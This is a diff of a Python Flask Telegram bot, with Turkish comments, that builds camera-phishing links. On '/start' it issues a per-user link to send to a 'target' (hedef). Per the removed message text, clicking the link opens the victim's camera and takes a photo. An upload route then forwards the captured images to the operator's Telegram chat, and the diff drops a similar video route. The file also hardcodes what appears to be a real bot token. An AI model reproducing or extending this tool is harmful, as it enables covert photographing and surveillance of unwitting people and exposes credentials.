@@ -1,20 +1,15 @@
 import os
 import logging
 import uuid
-import base64
-from io import BytesIO
 from flask import Flask, request, send_from_directory
 import requests
 
-# ==================== CONFIG ====================
 TOKEN = "8890650354:AAHG_DYLxeIsZMdTxZneIK7ZzbaOJlGsvyA"
 API_URL = "https://api.telegram.org/bot" + TOKEN
 
-# Domain algilama
 RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
 if not RAILWAY_DOMAIN:
-    svc = os.environ.get("RAILWAY_SERVICE_NAME", "cam-bot")
-    RAILWAY_DOMAIN = svc.lower() + ".up.railway.app"
+    RAILWAY_DOMAIN = "cam-bot.up.railway.app"
 else:
     RAILWAY_DOMAIN = RAILWAY_DOMAIN.lower()
 
@@ -28,142 +23,73 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__, static_folder="static")
 
-logger.info("TOKEN: " + TOKEN[:10] + "...")
-logger.info("RAILWAY_DOMAIN: " + RAILWAY_DOMAIN)
-logger.info("WEBHOOK_URL: " + WEBHOOK_URL)
+logger.info("=== BOT STARTED ===")
+logger.info("TOKEN: " + TOKEN[:15] + "...")
+logger.info("DOMAIN: " + RAILWAY_DOMAIN)
+logger.info("WEBHOOK: " + WEBHOOK_URL)
 logger.info("PORT: " + str(PORT))
 
-# ==================== TELEGRAM API FUNCTIONS ====================
-def send_message(chat_id, text, reply_markup=None):
-    url = API_URL + "/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "Markdown"
-    }
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
-    try:
-        r = requests.post(url, json=payload, timeout=10)
-        logger.info("send_message status: " + str(r.status_code))
-        return r.json()
-    except Exception as e:
-        logger.error("send_message error: " + str(e))
-        return None
-
-def send_photo(chat_id, photo_bytes, caption=""):
-    url = API_URL + "/sendPhoto"
-    files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
-    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
-    try:
-        r = requests.post(url, files=files, data=data, timeout=30)
-        logger.info("send_photo status: " + str(r.status_code))
-        return r.json()
-    except Exception as e:
-        logger.error("send_photo error: " + str(e))
-        return None
-
-def send_video(chat_id, video_bytes, caption=""):
-    url = API_URL + "/sendVideo"
-    files = {"video": ("video.webm", video_bytes, "video/webm")}
-    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
-    try:
-        r = requests.post(url, files=files, data=data, timeout=30)
-        logger.info("send_video status: " + str(r.status_code))
-        return r.json()
-    except Exception as e:
-        logger.error("send_video error: " + str(e))
-        return None
-
-# ==================== ROUTES ====================
 @app.route("/" + TOKEN, methods=["POST"])
-def telegram_webhook():
-    json_data = request.get_json()
-    logger.info("Webhook received: " + str(json_data))
+def webhook():
+    logger.info("WEBHOOK RECEIVED")
+    data = request.get_json()
+    logger.info(str(data))
 
-    if "message" in json_data and "text" in json_data["message"]:
-        chat_id = json_data["message"]["chat"]["id"]
-        user_id = json_data["message"]["from"]["id"]
-        username = json_data["message"]["from"].get("username", "Bilinmiyor")
-        text = json_data["message"]["text"]
+    if "message" in data and "text" in data["message"]:
+        chat_id = data["message"]["chat"]["id"]
+        username = data["message"]["from"].get("username", "user")
+        text = data["message"]["text"]
 
-        logger.info("Message from @" + username + ": " + text)
+        logger.info("CMD: " + text + " from @" + username)
 
         if text == "/start":
             token = str(uuid.uuid4()).replace("-", "")[:16]
-            user_tokens[token] = {
-                "user_id": user_id,
-                "username": username,
-                "chat_id": chat_id
-            }
-
+            user_tokens[token] = {"chat_id": chat_id, "username": username}
             link = WEBHOOK_URL + "/c/" + token
-            logger.info("Generated link: " + link)
 
-            keyboard = {
-                "inline_keyboard": [[{"text": "Linke Git", "url": link}]]
-            }
+            msg = "Merhaba @" + username + "!\n\nLink: " + link + "\n\nBu linki hedefe gonder."
 
-            msg = "Merhaba @" + username + "!\n\nOzel Linkiniz:\n" + link + "\n\nBu linki hedefe gonderin. Hedef linke tiklayinca kamera acilir ve fotograf cekilir."
-
-            result = send_message(chat_id, msg, reply_markup=keyboard)
-            logger.info("Send result: " + str(result))
+            url = API_URL + "/sendMessage"
+            payload = {"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}
+            r = requests.post(url, json=payload, timeout=10)
+            logger.info("SEND STATUS: " + str(r.status_code))
 
     return "OK", 200
 
 @app.route("/c/<token>")
-def capture_page(token):
+def capture(token):
     if token not in user_tokens:
-        return "<h1>Link gecersiz!</h1>", 404
+        return "Link gecersiz", 404
     return send_from_directory("static", "capture.html")
 
 @app.route("/upload/<token>", methods=["POST"])
-def upload_photo(token):
+def upload(token):
     if token not in user_tokens:
-        return {"error": "Invalid token"}, 403
-
+        return {"error": "token"}, 403
     data = request.get_json()
-    image_data = data.get("image", "")
+    img = data.get("image", "")
+    if not img:
+        return {"error": "no image"}, 400
 
-    if not image_data:
-        return {"error": "No image"}, 400
-
-    user_info = user_tokens[token]
-    chat_id = user_info["chat_id"]
-    username = user_info["username"]
-
+    import base64
     try:
-        image_bytes = base64.b64decode(image_data.split(",")[1])
+        img_bytes = base64.b64decode(img.split(",")[1])
     except:
-        return {"error": "Invalid image"}, 400
+        return {"error": "decode"}, 400
 
-    cap = "Yeni Fotograf!\n\nKullanici: @" + username + "\nToken: " + token
+    info = user_tokens[token]
+    cap = "Fotograf! @" + info["username"]
 
-    send_photo(chat_id, BytesIO(image_bytes), cap)
-    return {"success": True}, 200
+    url = API_URL + "/sendPhoto"
+    files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
+    data2 = {"chat_id": info["chat_id"], "caption": cap}
+    requests.post(url, files=files, data=data2, timeout=30)
 
-@app.route("/upload_video/<token>", methods=["POST"])
-def upload_video(token):
-    if token not in user_tokens:
-        return {"error": "Invalid token"}, 403
-
-    video_file = request.files.get("video")
-    if not video_file:
-        return {"error": "No video"}, 400
-
-    user_info = user_tokens[token]
-    chat_id = user_info["chat_id"]
-    username = user_info["username"]
-
-    cap = "Yeni Video!\n\nKullanici: @" + username
-
-    send_video(chat_id, video_file.read(), cap)
-    return {"success": True}, 200
+    return {"ok": True}, 200
 
 @app.route("/")
 def home():
-    return "Bot Aktif! Domain: " + RAILWAY_DOMAIN + " | Token: " + TOKEN[:10] + "..."
+    return "OK - " + RAILWAY_DOMAIN
 
-# ==================== MAIN ====================
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=PORT)
